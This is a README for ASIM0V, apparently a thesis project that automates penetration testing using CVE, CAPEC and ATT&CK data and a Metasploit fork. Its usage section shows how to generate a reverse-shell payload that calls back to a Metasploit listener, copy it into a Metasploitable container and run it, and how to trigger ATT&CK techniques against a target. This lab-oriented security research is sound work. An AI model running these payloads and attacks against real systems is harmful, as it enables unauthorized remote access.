# asim0v
Intro
This contains very limited information
Please refer to my thesis Automated Penetration Testing driven by  Cyber Threat Intelligence for which you can find below an excerpt from the abstract

"In this dissertation, we start giving a brief overview of basic security concepts, to then 
focus on penetration testing. We explore different security related sources of information 
provided by MITRE organization and how they can be aggregated to create a unique 
reference for both humans and machines, using a standard format for reporting Cyber 
Threat Intelligence using the STIX expression language. And starting from there we define 
our own workflow, taking leverage of the famous security tool Metasploit, in particular 
using its fork from Praetorian company. 
All our effort will be delivered as a new tool for Automated Security Intelligence 
Management for Zero Vulnerability, named ASIM0V, hopefully a starting point for the 
next students, that can focus in testing different targets, and also consolidating and 
expanding its features."


The repo also contains CVE, CWE, CAPEC and ATT&CK data. 
CVE need to be unzipped using unzip_first_cve_json.sh file 


Usage
After obtaining a list of CVE e.g. using vuln script from msfconsole
you can check if any attack-pattern available for that particular vulnerability

for CVE in `cat cvelist_metasploitable.txt`; do echo $CVE; curl localhost:9090/search?cve=$CVE | python -m json.tool; done > metasploitable_explorer_output.txt

to generate the malicious payload for the reverse shell
curl localhost:9191/payload -d "targetPlatform=linux/x86&metasploitAddress=metasploit&metasploitPort=4444" > payload

the output will be base64 encoded, must be decoded, copied to target (e.g. metasploitable) container and executed so that it will connect to the listener on metasploit 
base64 -d payload > decodedpayload
docker cp ./decodedpayload <containerId>:/


to retrieve which attack can be executed
curl localhost:9191/attacks?cve=CVE-ID
optionally you can append &targetPlatform=Windows or Linux or macOS

Once you have an attack, if implemented by purpleteam-attack-automation metasploit's fork then you can try to execute it

reverseShellPort is optional parameter in case you need to override the property file value
curl localhost:9191/execute -d "attack=t1016&targetPlatform=linux"
